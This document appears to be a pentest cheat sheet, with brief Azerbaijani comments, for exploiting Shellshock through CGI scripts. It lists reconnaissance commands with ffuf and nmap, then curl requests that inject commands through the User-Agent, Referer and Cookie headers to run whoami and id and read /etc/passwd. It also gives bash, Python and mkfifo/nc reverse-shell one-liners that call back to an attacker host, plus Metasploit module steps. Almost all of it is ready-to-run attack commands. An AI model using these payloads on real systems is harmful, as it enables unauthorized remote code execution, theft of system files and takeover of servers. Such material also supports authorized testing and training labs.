# Reconnaissance
```powershell
ffuf -u http://<TARGET>/cgi-bin/FUZZ \
  -w /usr/share/wordlists/dirb/small.txt \
  -e .cgi,.sh,.pl

/cgi-bin/access.cgi
/cgi-bin/test.cgi
/cgi-bin/status.cgi
/cgi-bin/admin.cgi
/cgi-bin/welcome.bat   ← Windows Tomcat (CVE-2019-0232)

nmap -sV --script http-shellshock \
  --script-args uri=/cgi-bin/access.cgi \
  -p 80,443 <TARGET>
```

# Test Vulnerability
```powershell
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"

# /etc/passwd oxu → zəiflik təsdiqlənir
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' \
  bash -s :'' \
  http://<TARGET>/cgi-bin/access.cgi
```

# Exploitation
```powershell
# whoami
curl -H 'User-Agent: () { :; }; echo; /usr/bin/whoami' \
  http://<TARGET>/cgi-bin/access.cgi

# id
curl -H 'User-Agent: () { :; }; echo; /usr/bin/id' \
  http://<TARGET>/cgi-bin/access.cgi

# hostname
curl -H 'User-Agent: () { :; }; echo; /bin/hostname' \
  http://<TARGET>/cgi-bin/access.cgi

# /etc/passwd
curl -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' \
  http://<TARGET>/cgi-bin/access.cgi
```

# Reverse Shell
```powershell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<LHOST>/7777 0>&1' \
  http://<TARGET>/cgi-bin/access.cgi

# Python reverse shell
curl -H 'User-Agent: () { :; }; echo; python3 -c '"'"'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"'"'' \
  http://<TARGET>/cgi-bin/access.cgi

# mkfifo reverse shell
curl -H 'User-Agent: () { :; }; echo; /bin/bash -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 7777 >/tmp/f"' \
  http://<TARGET>/cgi-bin/access.cgi

# Referer header vasitəsilə
curl -H 'Referer: () { :; }; echo; /usr/bin/whoami' \
  http://<TARGET>/cgi-bin/access.cgi

# Cookie header vasitəsilə
curl -H 'Cookie: () { :; }; echo; /usr/bin/whoami' \
  http://<TARGET>/cgi-bin/access.cgi
```

# Metasploit
```powershell
msfconsole

use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS <TARGET>
set TARGETURI /cgi-bin/access.cgi
set LHOST <LHOST>
run
```
